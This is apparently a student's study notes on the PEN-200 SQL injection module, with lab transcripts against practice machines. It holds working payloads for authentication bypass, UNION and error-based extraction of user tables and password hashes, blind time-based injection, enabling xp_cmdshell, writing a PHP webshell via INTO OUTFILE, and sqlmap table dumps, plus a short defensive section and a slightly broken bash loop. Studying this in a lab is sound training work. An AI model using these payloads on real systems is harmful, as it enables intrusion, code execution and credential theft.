---
title: "PEN-200 Module 10 \u2014 SQL Injection Field Notes"
slug: sql-injection
author: m4xx3d0ut
summary: "This module escalates quickly from theory to exploitation. The detailed\
  \ lab entries emphasize mapping the query, tuning payloads, and documenting impact.\
  \ Here\u2019s the enriched playbook."
publishedAt: '2023-08-30'
updatedAt: '2024-01-01'
readingMinutes: 58
tags:
- offsec
---
# PEN-200 Module 10 — SQL Injection Field Notes

## TLDR;

This module escalates quickly from theory to exploitation. The detailed lab entries emphasize mapping the query, tuning payloads, and documenting impact. Here’s the enriched playbook.

### Recon the Query Structure

1. Record endpoint, parameter, and HTTP method.
2. Probe with safe payloads:
   - `' OR 1=1--`
   - `" OR "1"="1".
   - `') ORDER BY 5--`
3. Watch for error messages (syntax, type mismatch, database banners). Capture screenshots.

```
# Column count discovery
tor='1 ORDER BY 1-- -'
for i in $(seq 1 10); do
  curl -s "https://portal.acme.local/product.php?id=${tor//$i/"$i"}" | grep -q "Server Error" && echo "Columns >= $i";
done
```

### Enumerate with UNION

- Find the number of columns using `ORDER BY n` or `UNION SELECT NULL,...` until the app stops erroring.
- Replace `NULL` with diagnostics: `@@version`, `database()`, `user()`, `table_name` from `information_schema.tables`.

```
' UNION SELECT 1,2,3,@@version,5,6-- -
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
```

### Blind Techniques

- Boolean: `AND 'a'='a'`, `AND (SELECT COUNT(*) FROM users) > 0`.
- Time-based: `AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)`.
- Content-diff: measure response length differences.

Log payloads and timing deltas; they evidence impact even without visible output.

### Data Exfiltration & Code Exec

- **MySQL:** `SELECT '<php code>' INTO OUTFILE '/var/www/html/shell.php'` (if file perms allow).
- **SQL Server:** enable `xp_cmdshell` and launch PowerShell payloads.
- **PostgreSQL:** `COPY (SELECT * FROM users) TO '/tmp/users.csv' WITH CSV`.

Capture resulting shells or downloaded files as proof.

### Automation Helpers

Manual exploitation teaches you the structure; once mapped, pivot to `sqlmap` for breadth.

```
sqlmap -u "https://portal.acme.local/product.php?id=1" --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
```

Store `sqlmap` audit logs and sanitized dumps; they belong in the technical appendix.

### Defensive Guidance

- Enforce prepared statements / parameterized queries.
- Operate databases under least-privileged accounts.
- Sanitize output to avoid leaking stack traces.
- Monitor for anomalous query patterns (long running times, UNION bursts, failed logins).

Module 10 rewards patience. Map the query by hand, record every payload, and automate only after you understand the data flow.

## Working Notes... In Graphic Detail...

#### SQL Injection Attacks

- SQL Theory and Database Types.
- Manual SQL Exploitation.
- SQL Attack Automation.

##### 10.1 SQL Theory and Databases 

- Refresh SQL theory fundamentals.
- Learn different DB types.
- Understand different SQL syntax.

###### SQL Theory Refresher

Structured Query Language (SQL) has been developed specifically to manage and interact with data stored inside [relational databases](https://en.wikipedia.org/wiki/Relational_database).

**Example:** parse user table and retrieve a specified user entry.
```
SELECT * FROM users WHERE user_name='noel'
```

Web apps automate functionality by embedding SQL queries in their source code, see the PHP example;
```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
*Please note that the i inside the mysqli_query PHP function stands for improved and should not be confused with the vulnerability (as the i in SQLi stands for injection).*

In order to search the database, the SQL server runs the query SELECT * FROM users WHERE user_name= noel. If, instead, the user enters "noel '+!@#$", the SQL server will run the query SELECT * FROM users WHERE user_name= noel'+!@#$. Nothing in our code block checks for these special characters, and it's this lack of filtering that causes the vulnerability.

###### DB Types and Characteristics

- We will not always know the type of underlying DB.
 - Always be ready to ineract with different variants.
 - Most common;
		- [MySQL](https://www.mysql.com/)
			- [MariaDB](https://mariadb.org/)
    - Open Source variant.
		- [MSSQL](http://www.microsoft.com/sqlserver)

*The two SQL variants we're exploring in this Module are not limited to on-premise installations, as they can often be found in cloud deployments.*

**MySQL & MariaDB Basics**
- Connect to SQL instance.
- Run version to retrieve version of running instance.
- Verify current DB user.
```
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ mysql -u root -p'root' -h 192.168.214.16 -P 3306 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.21 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (2.847 sec)

MySQL [(none)]> select system_user();
+---------------------+
| system_user()       |
+---------------------+
| root@192.168.45.223 |
+---------------------+
1 row in set (0.081 sec)

MySQL [(none)]> 

```

- List DBs running on instance.
- Retrieve password of offsec user in mysql DB.
 - Stored with Caching-SHA-256.
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.467 sec)

MySQL [(none)]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; 
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6 |
+--------+------------------------------------------------------------------------+
1 row in set (0.081 sec)

MySQL [(none)]> 
```

**MSSQL Basics**
- Built in CLI.
 - SQLCMD.
 - Allows queries to be run through Win CMD.
  - Or remotely from another system.
- Kali includes Impacket.
 - Python framework for network proto interactions.
		- Supports Tabular Data Stream (TDS)
   - Proto adopted by MSSQL.
		- Implemented in `impacket-mssqlclient` tool.
- Run `impacket-mssqlclient` to conn remote machine.
 - Req options.
  - Username.
  - Password.
  - Remote IP.
  - Keyword `-windows-auth`
   - Forces NTLM auth instead of Kerberos.
- Inspect current version of the underlying OS `@@version`
```
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ impacket-mssqlclient Administrator:Lab123@192.168.214.18 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)

```
*When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by GO on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.*

- Lista all available DBs.
- Review DB by querying tables in the corresponding `information_schema`
- Inspect table records, specify `dbo` schema between DB and table name!
```
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb     

offsec   

SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
offsec          dbo            users        b'BASE TABLE'   

SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.dbo.users;
username     password     
----------   ----------   
admin        lab          

guest        guest        

SQL (SQLPLAYGROUND\Administrator  dbo@master)> 

```
*CLEAR TEXT PASSWORDS returned by query!*

###### DB Types and Characteristics Exercises

From your Kali Linux VM, connect to the remote MySQL instance on VM 1 and replicate the steps to enumerate the MySQL database. Then explore all values assigned to the user offsec. Which plugin value is used as a password authentication scheme?

`caching_sha2_password`
```
MySQL [(none)]> SELECT * FROM mysql.user WHERE user = 'offsec';
+-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
| Host      | User   | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                                                  | password_expired | password_last_changed | password_lifetime | account_locked | Create_role_priv | Drop_role_priv | Password_reuse_history | Password_reuse_time | Password_require_current | User_attributes |
+-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
| localhost | offsec | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6 | N                | 2022-05-06 11:47:11   |              NULL | N              | N                | N              |                   NULL |                NULL | NULL                     | NULL            |
+-----------+--------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+
1 row in set (2.432 sec)
```

From your Kali Linux VM, connect to the remote MSSQL instance on VM 2 and replicate the steps to enumerate the MSSQL database. Then explore the records of the sysusers table inside the master database. What is the value of the first user listed?
```
public
```

From your Kali Linux VM, connect to the remote MySQL instance on VM 3 and explore the users table present in one of the databases to get the flag.
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.086 sec)

MySQL [(none)]> use test;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [test]> show tables;
+----------------+
| Tables_in_test |
+----------------+
| users          |
+----------------+
1 row in set (0.081 sec)

MySQL [test]> select * from users;
+----+--------------------------------------+
| id | username                             |
+----+--------------------------------------+
|  1 | yoshi                                |
|  2 | luigi                                |
|  3 | wario                                |
|  4 | OS{1e1db601e36cab492a642a92c4bb1811} |
|  5 | mario                                |
+----+--------------------------------------+
5 rows in set (0.087 sec)

```


##### 10.2 SQL Theory and Databases

- Manually identify SQL injection vulnerabilities.
- Understand UNION SQLi payloads.
- Learn about Error SQLi payloads.
- Understand Blind SQLi payloads.

###### Identifying SQLi via Error-based Payloads

```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
- In the PHP snipped above.
 - `uname` and `password` are user-supplied.
  - This means we can control the `$sql_query` variable.
   - Allows us to craft a new query!
- In some cases SQLi can lead to auth bypass, the first vector we will explore.
- By forcing the closing quote on `uname` and adding `OR 1=1` followed by a `--` comment seperator and `//` we can prematurely terminate the SQL statement.
	- The syntax for this type of comment requires `//` followed by ` ` whitespace char.
- Trailing the comments with `//` provides.
 - Visibility on payload.
 - Some protection agains whitespace truncation employed by web app.
```
offsec' OR 1=1 -- //
```

As a result, forwarde to SQL server;
```
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

- The appended OR statement will always be true.
- The WHERE clause will return the first user ID present in DB.
 - Whether or not the record is present.
- Because no other checks are implemented by app, we gain admin privs by circumventing auth logic!

**Offsec - SQLi  Playground**
- Enter user `offsec` password `jam`
 - Invalid password message returned.
- Insert special char `'` and try again.
	- Error returned!
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '5275cb415e5bc3948e8f2cd492859f26'' at line 1
```
*SQL injection is considered in-band when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we've enabled SQL debugging inside the web application; however, most production-level web applications won't show these error messages because revealing SQL debugging information is considered a security flaw.*

- Given above result, try the auth bypass payload `offsec' OR 1=1 -- //`
 - **Authentication Successfull!!!**.
- We can also inject an arbitrary second statement.
```
' or 1=1 in (select @@version) -- //
```
- Version returned in Error!
```
Warning: 1292: Truncated incorrect DOUBLE value: '8.0.28'

Authentication Successfull
```
*MySQL accepts both version() and @@version statements.*
- We are able to query the DB interactively, as if we were at an admin terminal.
- We can try to dump all of the data in the user tables;
```
' OR 1=1 in (SELECT * FROM users) -- //
```
- We return an error, telling us to query only one column at a time.
```
Error: Operand should contain 1 column(s)
```
- We will grab the passoword col.
```
' or 1=1 in (SELECT password FROM users) -- //
```
- Returns, what appear to be MD5 password hashes;
```
Warning: 1292: Truncated incorrect DOUBLE value: '21232f297a57a5a743894a0e4a801fc3' Warning: 1292: Truncated incorrect DOUBLE value: 'f9664ea1803311b35f81d07d8c9e072d' Warning: 1292: Truncated incorrect DOUBLE value: '5f4dcc3b5aa765d61d8327deb882cf99' Warning: 1292: Truncated incorrect DOUBLE value: '5653c6b1f51852a6351ec69c8452abc6'

Invalid password!
```
- We don't know which hash corresponds to which user, we can retrieve admin directly;
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
- The admin user MD5 has returns;
```
Warning: 1292: Truncated incorrect DOUBLE value: '21232f297a57a5a743894a0e4a801fc3'

Invalid password!
```

**We have predictably fetched table data with the Error-Based SQLi vuln we discovered!**

###### UNION-based Payloads

- When dealing with in-band SQLi and the result of the query is returned along with the application-returned value;
	- Test for UNION-BASED SQL Injection next!!!
- [UNION](https://www.w3schools.com/sql/sql_union.asp) keyword.
 - Enables an extra select statement in a single query.
 - Providing both results.
 - Concat both query into one statement.

UNION SQLi requires two conditions to be true;
- The injected UNION has the same number of cols as the original query.
- Data types of the cols must be compatible.

To demonstrate;
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
- [LIKE](https://www.w3schools.com/sql/sql_like.asp)
- Before crafting attack we need to know the exact number of cols in the target table.
 - The example output shows 4 cols, but we should not assume.
 - There may be extra cols not displayed.
- To discover the actual number of cols, inject;
	- `' ORDER BY 1-- //`
- The above statement orders the results by a specific col.
 - It will fail when sel col does not exist.
 - Inc the col val by 1 each time.
```
' ORDER BY 6-- //
```
Returns;
```
Unknown column '6' in 'order clause'
```
- Odering by col 6 returns an error.
 - We have determined there are 5 cols.
- With this info we can craft first attack.
 - Since we want to use the customer table;
		- `%'`
 - Begin injected query with;
		- `UNION SELECT`
 - Statement dumps current DB, user, MySQL version in first, second, third col and leaves fourth, fifth NULL.
		- `database(), user(), @@version, null, null -- //`
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
Returns;
```
Name	Phone	Address	Country
Vladimir Vega	1-482-784-2019	900-5245 Ornare Ave	South Africa
Xavier Wolf	(559) 271-7551	564-4427 Pede Road	Poland
Lane Wooten	(684) 688-7367	562-4770 Gravida Road	Vietnam
Laurel Chavez	(481) 611-0866	6184 Vivamus Ave	Singapore
Holmes Griffith	(714) 669-5321	Ap #133-6689 Vestibulum Rd.	Singapore
root@172.30.0.3	8.0.28
```
- Username and DB version on last line, but DB name is not.
 - This happens because col 1 is typically reserved for an ID field of `integer` data type.
  - It cannot return the string value through the `SELECT databse()` statement.
   - *The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users.*.
- Knowing this, shift enumerating functions to the right-most positions.
 - Avoids type mismatches.
 - *Since we verified the expected output, we can omit the % sign in our new query*.
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
Returns;
```
Name	   Phone	   Address	Country
offsec	   root@172.30.0.3	   8.0.28
```
- Values have returned correctly, showing `offsec` as the current DB.

Extend this attack by verifying if other tables are present in the current DB!
- Start by enumerating  the [information schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) of current DB.
 - From the `information_schema.columns` table.
- Attempt to obtain columns table from information_schema DB belonging to current DB.
 - Store output in second, third, fourth cols leaving first, fifth NULL.
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
Returns;
```
Name	Phone	Address	Country
customers	address	offsec	
customers	country	offsec	
customers	id	offsec	
customers	name	offsec	
customers	phone	offsec	
users	description	offsec	
users	id	offsec	
users	password	offsec	
users	username	offsec
```
- Output verifies that the three columns contain;
 - Table name.
 - Column name.
 - Current DB name.
- We also discover a new table, `users` , which includes four columns;
 - Description.
 - Id.
  - Default int.
 - Password.
  - **interesting**.
 - Username.
- We can craft a new query to dump the users table;
```
' UNION SELECT null, username, password, description, null FROM users -- //
```
Returns;
```
Name	Phone	Address	Country
admin	21232f297a57a5a743894a0e4a801fc3	this is the admin	
offsec	f9664ea1803311b35f81d07d8c9e072d	try harder	
boba	5f4dcc3b5aa765d61d8327deb882cf99	freeze	
han	5653c6b1f51852a6351ec69c8452abc6	pew pew
```

Our UNION based payload has fetched the usenames and MD5 password hashes of the entire user table, including and admin account (huzzah!).
*The MD5 vals can be reversed using appropriate tools.*

###### Blind SQL Injections

The SQLi payloads we have worked with so far are "in-band", meaning we retrieve the content of our query inside the web app.

Blind SQLi is a case where responses are never returned.  Response is inferred using;
- Boolean.
- Time-based logic.

Boolean-based blind SQL injection causes the app to return different predictible values whenever the DB returns TRUE or FALSE.
*Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.*

Time-based blind SQLi infer the query result by instructing the DB to wait for a specified amount of time.  Based on response time, we can conclude if the statement is TRUE or FALSE.

Log into blind SQLi test page and notice that the URL takes a `user` param;
```
http://192.168.202.16/blindsqli.php?user=offsec
```
- This value defaults to the logged in user, offsec.
- App prints the user record;
 - Username.
 - Password MD5 hash.
 - Description.
- To test for boolean-based SQLi we can append the following payload;
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
- Since 1=1 is TRUE the app will return values only if the user is present in the DB.
 - Using this syntax you could enumerate the entire DB.
- With time based payload;
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
- Note app hangs for 3 seconds before returning.
 - TRUE.
- Returns immediately.
 - FALSE.
*This type of attack is time consuming and should be automated through tools like SQLmap*

###### 10.2 SQL Theory and Databases Excercises

Boot up VM 1 and replicate the SQLi authentication bypass payload we have explored in this Learning Unit. In this section, which PHP variable is used to store user's input?
```
# See snippet below

<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>

# You would think $uname or $sql_query, this is wrong
# $uname is assigned from the PHP variable, get it?

$_POST    # <-- Is the variable that stores user input
```

Continue working on VM 1 and replicate the SQLi UNION-based attack we have discussed in this Learning Unit. For the UNION-based attack to succeed, what other condition needs to be satisfied in addition to having the same data types among the two queries?
```
Same number of columns
```

Replicate the time-based and boolean-based blind SQL injections described in this Learning Unit on the VM 1. Blind SQLi are called like this because the database output is never returned to the user. To infer the result of the query, the output of which component is employed instead?
```
# The output is infered by predictable results returned from the...
web application
```

##### 10.3 Manual and Automated Code Execution

- Exploit MSSQL Databases with xp_cmdshell.
- Automate SQL Injection with SQLmap.

###### Manual Code Execution

**MSSQL**
- Depending on the underlying DB system we are targeting we must adapt strategy to attain code exec.
 - In MSSQL [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function takes a string and passes it to a command shell for execution.
 - Output returned as rows of text.
 - NOTE: this funtion is disabled by default.
  - Once enabled; must be called with EXECUTE keyword instead of SELECT.

*In th example DB the Administrator user has the appropriate perms, enable xp_cmdshell by simulating SQLi via impacket-mssqlclient*
```
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ impacket-mssqlclient Administrator:Lab123@192.168.209.18 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
```
- After logging in as Administrator.
 - We enable show advanced options by setting it to 1.
 - Apply the changes with RECONFIGURE.
 - Enable xp_cmdshell.
 - Apply the config with RECONFIGURE.
- With this feature enabled we can execute Win shell commands using the EXECUTE keyword followed by `xp_cmdshell` command name;
```
SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL
```
- Since we now have full control over the system we can upgrade the SQL shell to a reverse shell.
 - *MySQL DB variants don't offer a single func to escalate to RCE we can utilize [SELECT INTO_OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statment to write files to the server, as long as the location is writeable by the user running the DB*.

**MySQL Variants**
- Example: Using a UNION payload we will expand the query to write a webshell to disk.
 - Issue UNION SELECT SQL keywords to include a single PHP line into the first col and save it as `webshell.php` in a writeable web folder;
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
- This results in a simple PHP reverse shell written to disk containing;
```
<? system($_REQUEST['cmd']); ?>
```
*The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.*
- NOTE: You may see return type errors, this should not impact the webshell being written to disk so always check!
- Confirm the webshell has written `http://192.168.209.19/tmp/webshell.php?cmd=id`
```
uid=33(www-data) gid=33(www-data) groups=33(www-data) \N \N \N \N
```

###### Automating the Attack

- The SQLi techniques covered can be automated with several tools.
 - Sqlmap.
  - Can ID and exploit SQLi vulns against various DB engines.
  - Set the URL we want to scan with `-u` and specify the parameter to test using `-p`
```
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:23:34 /2023-09-01/

[08:23:34] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.209.19/login1.php?msg=2'. Do you want to follow? [Y/n] 
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=8c85dj76cse...amvo797htl'). Do you want to use those [Y/n] 
[08:23:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:23:59] [INFO] testing if the target URL content is stable
[08:23:59] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
[08:24:00] [INFO] testing for SQL injection on GET parameter 'user'
[08:24:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:24:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:24:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:24:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:24:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[08:24:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[08:24:06] [INFO] testing 'Generic inline queries'
[08:24:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:24:06] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
[08:24:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[08:24:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[08:24:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:24:31] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[08:25:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:25:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:25:08] [INFO] checking if the injection point on GET parameter 'user' is a false positive
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 5276 FROM (SELECT(SLEEP(5)))EDkh) AND 'UGNi'='UGNi
---
[08:26:42] [INFO] the back-end DBMS is MySQL
[08:26:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[08:26:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52, PHP
back-end DBMS: MySQL >= 5.0.12
[08:26:44] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/192.168.209.19'

[*] ending @ 08:26:44 /2023-09-01/
```
*We submitted the entire URL after the -u specifier together with the ?user parameter set to a dummy value. Once launched, we can press I on the default options. Sqlmap then returns confirmation that we are dealing with a time-based blind SQL injection and provides additional fingerprinting information such as the web server operating system, web application technology stack, and the backend database.*

- We can also dump the DB table and steal creds with sqlmap.
 - *Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.*.
```
┌──(operator㉿labhost)-[~/OffSec/shells]
└─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:29:06 /2023-09-01/

[08:29:07] [INFO] resuming back-end DBMS 'mysql' 
[08:29:07] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.209.19/login1.php?msg=2'. Do you want to follow? [Y/n] 
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=tdgkom9olin...iqhjvdg3er'). Do you want to use those [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 5276 FROM (SELECT(SLEEP(5)))EDkh) AND 'UGNi'='UGNi
---
[08:29:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52, PHP
back-end DBMS: MySQL >= 5.0.12
[08:29:10] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[08:29:10] [INFO] fetching current database
[08:29:10] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
